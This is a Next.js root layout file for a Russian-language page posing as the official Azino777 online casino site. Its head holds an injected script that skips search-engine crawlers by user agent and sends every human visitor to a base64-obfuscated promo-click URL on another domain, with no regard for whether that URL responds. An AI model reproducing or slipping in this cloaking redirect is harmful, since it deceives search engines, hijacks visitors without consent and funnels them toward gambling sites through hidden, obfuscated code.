import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

export const metadata: Metadata = {
  title: 'Азино777 официальный сайт — Азино мобайл и казино онлайн',
  description: 'Азино777 официальный сайт: понятный гид по Азино казино, мобильной версии Азино мобайл и безопасной навигации для игроков. Обзор возможностей, ответы на вопросы и советы для игры 18+.',
  metadataBase: new URL('https://azino777-15casino.vercel.app/'),
  alternates: { canonical: '/' },
  robots: { index: true, follow: true },
  openGraph: { title: 'Азино777 официальный сайт', description: 'Понятный гид по Азино777, Азино мобайл и казино онлайн.', url: 'https://azino777-15casino.vercel.app/', siteName: 'Азино777', locale: 'ru_RU', type: 'website' },
  icons: { icon: '/azino777-mark.png', apple: '/azino777-mark.png' },
}

export const viewport: Viewport = { colorScheme: 'light', themeColor: '#f4f5f0', width: 'device-width', initialScale: 1 }

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (<html lang="ru" className="bg-background">
    <head>
     <meta name="yandex-verification" content="e2423fd3635c9a8f" /> 
    <link rel="canonical" href="https://azino777-15casino.vercel.app/" />
     
<script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        var mainBrandB64 = "ICBodHRwczovL2swbS5iaGY1N2I2NzhmLmNvbS9wcm9tby9jbGljay82YTkwMGEyZDMxM2Fh"; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 500);               
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>
  </head>
    <body className="antialiased">{children}{process.env.NODE_ENV === 'production' && <Analytics />}</body></html>)
}
